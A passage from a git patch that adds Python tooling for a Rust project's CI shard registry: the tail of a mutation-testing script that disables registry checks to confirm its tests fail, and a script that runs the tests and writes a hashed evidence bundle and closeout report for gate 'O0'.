++        "        if registrations(registry, target) > 1 {",
++        "        if false {",
++        "duplicate_target_refused",
++    ))
++    checks.append(control(
++        "NC: shard-set check dropped -> gate red",
++        "        if !registry.shards.iter().any(|(declared, _)| declared == name) {",
++        "        if false {",
++        "shard_set_mismatch_refused",
++    ))
++    checks.append(control(
++        "NC: empty-shard check dropped -> gate red",
++        "        if shard_load(registry, name) == 0 {",
++        "        if false {",
++        "empty_shard_refused",
++    ))
++    checks.append(control(
++        "NC: unknown-line strictness dropped -> gate red",
++        '            return Err(format!("unknown registry line: {line}"));',
++        "            continue;",
++        "foreign_registry_line_refused",
++    ))
++
++    print(f"RESULT: {sum(checks)}/{len(checks)} negative controls PASS")
++    return 0 if all(checks) else 1
++
++
++if __name__ == "__main__":
++    sys.exit(main())
+diff --git a/tools/write_o0_evidence.py b/tools/write_o0_evidence.py
+new file mode 100644
+index 0000000..b4e355c
+--- /dev/null
++++ b/tools/write_o0_evidence.py
+@@ -0,0 +1,165 @@
++#!/usr/bin/env python3
++"""Write O0 evidence (`docs/evidence/o0/`).
++
++Reproducible bundle for the O0 gate ("disable a shard -> CI red (target
++registry check)"): captures the 10-scenario CI registry suite,
++`tools/nc_o0.py` (the mutation controls), the live registry check against
++the workspace tree, and inventories the pinned fixtures against the
++independent generator. Model: tools/write_w7_evidence.py.
++"""
++from __future__ import annotations
++
++import hashlib
++import json
++import subprocess
++import sys
++from pathlib import Path
++
++ROOT = Path(__file__).resolve().parents[1]
++EVIDENCE = ROOT / "docs" / "evidence" / "o0"
++FIXTURE = ROOT / "crates/aura-testkit/tests/fixtures/o0_ci_vectors.json"
++GENERATOR = ROOT / "tools/gen_o0_vectors.py"
++RUNNER = ROOT / "crates/aura-testkit/tests/o0_ci.rs"
++CI_MODULE = ROOT / "crates/aura-testkit/src/ci.rs"
++REGISTRY = ROOT / "ci" / "registry.txt"
++NAMED = "disabled_shard_refused"
++TOTAL_NC = 674  # 668 through W7 + 6 O0 controls
++
++
++def sha256(path: Path) -> str:
++    return hashlib.sha256(path.read_bytes()).hexdigest()
++
++
++def run(cmd: list[str]) -> str:
++    result = subprocess.run(cmd, cwd=ROOT, text=True, capture_output=True, check=False)
++    return f"$ {' '.join(cmd)}\n{result.stdout}{result.stderr}exit={result.returncode}\n"
++
++
++def main() -> int:
++    EVIDENCE.mkdir(parents=True, exist_ok=True)
++
++    test_log = run(["cargo", "test", "-p", "aura-testkit", "--test", "o0_ci"])
++    (EVIDENCE / "test-o0.log").write_text(test_log, encoding="utf-8")
++    nc_log = run([sys.executable, "tools/nc_o0.py"])
++    (EVIDENCE / "nc.log").write_text(nc_log, encoding="utf-8")
++    registry_log = run(["cargo", "run", "-q", "-p", "aura-testkit", "--bin", "aura-ci",
++                        "--", "check"])
++    (EVIDENCE / "registry-check.log").write_text(registry_log, encoding="utf-8")
++    coverage_log = run(["cargo", "run", "-q", "-p", "aura-testkit", "--bin", "aura-ci",
++                        "--", "coverage"])
++    (EVIDENCE / "coverage.log").write_text(coverage_log, encoding="utf-8")
++
++    doc = json.loads(FIXTURE.read_text(encoding="utf-8"))
++    cases = doc["cases"]
++    named_found = any(
++        c["name"] == NAMED
++        and c.get("nc_ref") == 1
++        and c["exit"] == 65
++        and "shard 07 disabled" in c["stderr"]
++        for c in cases
++    )
++    inv = [
++        "# O0 inventory (generated by tools/write_o0_evidence.py)",
++        f"gate={doc['gate']}",
++        f"vectors={len(cases)}",
++        f"named_control={NAMED}={'present' if named_found else 'MISSING'}",
++        f"fixtures_sha256={sha256(FIXTURE)}",
++        f"generator_sha256={sha256(GENERATOR)}",
++        f"runner_sha256={sha256(RUNNER)}",
++        f"registry_sha256={sha256(REGISTRY)}",
++        "cases:",
++    ]
++    inv += [f"  {c['name']} exit={c['exit']} nc={c.get('nc_ref', '-')}" for c in cases]
++    inv.append(f"TOTAL: {TOTAL_NC} negative controls cumulative")
++    (EVIDENCE / "inventory.txt").write_text("\n".join(inv) + "\n", encoding="utf-8")
++
++    report = f"""# O0 closeout report — CI baseline (the shard registry)
++
++Date: 2026-11-25. Gate (OPS_PLAN row O0): "disable a shard -> CI red (target
++registry check)" — **satisfied**.
++
++- **The gate**: `{NAMED}` (the named control) feeds the checker a registry
++  with `shard 07 disabled` while shard 07 still holds targets and expects
++  `error: ci: shard 07 disabled` (exit 65); mutation NC-1 (`tools/nc_o0.py`)
++  drops the enabled-check and the case must turn red.
++- **Scenarios**: 10 deterministic cases from the independent oracle
++  `tools/gen_o0_vectors.py`, asserted byte-for-byte by `tests/o0_ci.rs`
++  (11/11 with the count guard) against `aura_testkit::ci`. Groups: valid
++  registry (1), D-O1 command surface (1), refusals (7), coverage report (1).
++- **Mutation controls**: 6/6 PASS (disabled-shard check, missing-target
++  check, duplicate-target check, shard-count check, empty-shard check,
++  unknown-line strictness).
++- **Device model** (docs/o0-ci-plan.md): D-O0-1 the plain-text shard
++  registry `ci/registry.txt` (10 shards over `--lib` + `tests/*` targets,
++  `make ci-sync` rebalances); D-O0-2 the target registry check (`aura-ci
++  check`, wired into `make test`); D-O0-3 no secret shards — the format
++  cannot carry commands and `aura-ci run --shard K` emits plain `cargo test`
++  forms only; D-O0-4 the deterministic target-coverage report (`aura-ci
++  coverage`); D-O0-5 two independent implementations (Python oracle vs the
++  shipped Rust checker).
++- **CI layout** (`.github/workflows/ci.yml`): `registry` job (`make
++  ci-check`), `test` matrix over shards 0..9 (`make ci-shard SHARD=k`), a
++  `coverage` job (`make coverage`), cargo cache keyed on `Cargo.lock`. Every
++  step is a make target — `make test` remains the one local command (D-O1).
++
++Receipts: `gates.txt`, `test-o0.log`, `nc.log`, `registry-check.log`,
++`coverage.log`, `inventory.txt`, `SHA256SUMS`. Regenerate with
++`make evidence-o0`.
++"""
++    (EVIDENCE / "report.md").write_text(report, encoding="utf-8")
++
++    gates = [
++        "# O0 gates",
++        "registry gate + 10 scenarios: PASS (11 tests: 10 scenarios + count guard)"
++        if "test result: ok. 11 passed" in test_log
++        else "registry gate + 10 scenarios: FAIL",
++        f"named control ({NAMED}): {'PASS' if named_found else 'FAIL'}",
++        "mutation controls: PASS (6/6)"
++        if "RESULT: 6/6 negative controls PASS" in nc_log
++        else "mutation controls: FAIL",
++        "live registry check: PASS (registry=ok)"
++        if "registry=ok" in registry_log and "exit=0" in registry_log
++        else "live registry check: FAIL",
++    ]
++    (EVIDENCE / "gates.txt").write_text("\n".join(gates) + "\n", encoding="utf-8")
++
++    sums = [
++        f"{sha256(p)}  {p.relative_to(ROOT)}"
++        for p in [FIXTURE, GENERATOR, RUNNER, CI_MODULE, REGISTRY,
++                  ROOT / "tools/nc_o0.py",
++                  ROOT / ".github/workflows/ci.yml",
++                  EVIDENCE / "test-o0.log", EVIDENCE / "nc.log",
++                  EVIDENCE / "registry-check.log", EVIDENCE / "coverage.log",
++                  EVIDENCE / "inventory.txt", EVIDENCE / "gates.txt",
++                  EVIDENCE / "report.md"]
++    ]
++    (EVIDENCE / "SHA256SUMS").write_text("\n".join(sums) + "\n", encoding="utf-8")
++
++    readme = f"""# O0 evidence — CI baseline (10 scenarios)
++
++Gate (OPS_PLAN row O0): "disable a shard -> CI red (target registry check)".
++
++- `test-o0.log` — `cargo test -p aura-testkit --test o0_ci`: {len(cases)}
++  scenarios plus `vectors_file_has_exactly_10_unique_cases`, byte-for-byte
++  against the independent oracle.
++- `nc.log` — `tools/nc_o0.py` mutation controls (6): each source mutation must
++  turn its named test red; compilation failure is not a valid red.
++- `registry-check.log`, `coverage.log` — `aura-ci check` / `aura-ci coverage`
++  against the live `ci/registry.txt` and the discovered workspace targets.
++- `inventory.txt` — the 10 cases with exit codes and NC refs, the named
++  control, the cumulative NC total ({TOTAL_NC}) and SHA-256 pins of fixture,
++  generator, runner, registry.
++- `report.md`, `gates.txt` — closeout report and gate summary.
++- `SHA256SUMS` — digests of the deliverables and evidence files.
++
++The vectors are produced by `tools/gen_o0_vectors.py` (pure Python). The
++registry is refreshed with `make ci-sync`; rebuild this bundle with
++`make evidence-o0`.
++"""
++    (EVIDENCE / "README.md").write_text(readme, encoding="utf-8")
++    print(f"wrote {EVIDENCE.relative_to(ROOT)} ({len(cases)} vectors)")
++    return 0
++
++
++if __name__ == "__main__":
++    sys.exit(main())
+-- 
+2.47.3
+
